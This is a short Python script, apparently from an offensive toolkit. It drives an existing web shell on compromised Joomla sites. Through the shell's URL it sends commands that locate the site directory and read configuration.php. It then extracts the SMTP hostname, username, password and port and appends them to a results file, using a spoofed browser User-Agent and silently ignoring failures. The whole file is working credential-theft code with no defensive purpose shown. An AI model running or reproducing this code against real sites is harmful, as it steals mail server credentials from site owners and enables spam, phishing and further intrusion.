import requests, re


Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def GETSmtpJoomConf(ReadSMtpCnf):
    try:
        if 'public $smtpuser =' in ReadSMtpCnf:
            user = re.findall("smtpuser = '(.*)';", ReadSMtpCnf)[0]
            pw = re.findall("smtppass = '(.*)';", ReadSMtpCnf)[0]
            host = re.findall("smtphost = '(.*)';", ReadSMtpCnf)[0]
            port = re.findall("smtpport = '(.*)';", ReadSMtpCnf)[0]
            if user == '' or user == 'localhost':
                pass
            else:
                with open('result/SMTP_Results.txt', 'a') as writer:
                    writer.write(
                        'HostName: {}'.format(host) + '\nuser: {}'.format(user) +
                        '\nPass: {}'.format(pw) + '\nPORT: {}'.format(port) +
                        '\n-----------------------------------------\n')
    except:
        pass

def JooomlaSMTPshell(EvalShell):
    try:
        evsh = EvalShell
        EvalShell = EvalShell.split("=")[0] + '='
        if 'system' in evsh:
            pass
        else:
            if EvalShell.startswith('http://'):
                EvalShell = EvalShell.replace('http://', '')
            elif EvalShell.startswith("https://"):
                EvalShell = EvalShell.replace('https://', '')
            else:
                pass
            path0 = EvalShell.split('/')[1]
            a = requests.get('http://{}'.format(EvalShell) + "echo '||';pwd;echo '||';", timeout=10, headers=Headers)
            path = str(a.content).split('||')[1]
            lastpath = path.split(path0)[0]
            try:
                lastpath = lastpath.split('\n')[1]
            except:
                pass
            x = "echo '||';cd {};cat configuration.php;echo '||';".format(str(lastpath))
            ReadSMtpCnf = requests.get('http://{}/'.format(EvalShell) + x)
            GETSmtpJoomConf(str(ReadSMtpCnf.content))
    except:
        pass